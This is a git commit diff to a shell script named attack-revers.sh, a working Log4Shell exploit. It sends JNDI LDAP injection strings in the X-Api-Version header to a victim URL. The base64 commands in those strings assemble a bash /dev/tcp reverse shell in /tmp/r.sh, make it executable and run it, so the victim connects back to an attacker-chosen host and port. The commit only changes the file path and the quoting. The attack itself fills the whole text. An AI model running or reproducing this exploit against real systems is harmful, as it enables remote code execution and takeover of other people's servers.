c951469ca74cc7603f9501c55a87ff8194f1309a
ap <ap@localhost>
2021-12-14 01:55:39 +0100

    commit

--- attack-revers.sh
+++ attack-revers.sh
@@ -17,24 +17,24 @@ REVERS_PORT=$( echo $3 | cut -f2 -d: )
 #curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
 
 
-# Create /r.sh with /dev/tcp revers shell
+# Create /tmp/r.sh with /dev/tcp revers shell
 # 3 requests due to problems with parsing and payload size - yes i know - it's lame - 31336 :(
 
-PAYLOAD=$( echo 'echo -en "bash -i >& /dev/tcp" > /r.sh' | base64)
+PAYLOAD=$( echo 'echo -en "bash -i >& /dev/tcp" > /tmp/r.sh' | base64)
 curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
 
-PAYLOAD=$( echo "echo -en /${REVERS_HOST}/${REVERS_PORT} >> /r.sh" | base64)
+PAYLOAD=$( echo "echo -en \"/${REVERS_HOST}/${REVERS_PORT}\" >> /tmp/r.sh" | base64)
 curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
 
-PAYLOAD=$( echo 'echo -en " 0>&1\n\n" >> /r.sh' | base64)
+PAYLOAD=$( echo 'echo -en " 0>&1\n\n" >> /tmp/r.sh' | base64)
 curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
 
 
-# chmod +x /r.sh
-PAYLOAD=$( echo 'chmod +x /r.sh' | base64)
+# chmod +x /tmp/r.sh
+PAYLOAD=$( echo 'chmod +x /tmp/r.sh' | base64)
 curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
 
 # run revers shell
-PAYLOAD=$( echo 'bash /r.sh' | base64)
+PAYLOAD=$( echo 'bash /tmp/r.sh' | base64)
 curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"
 
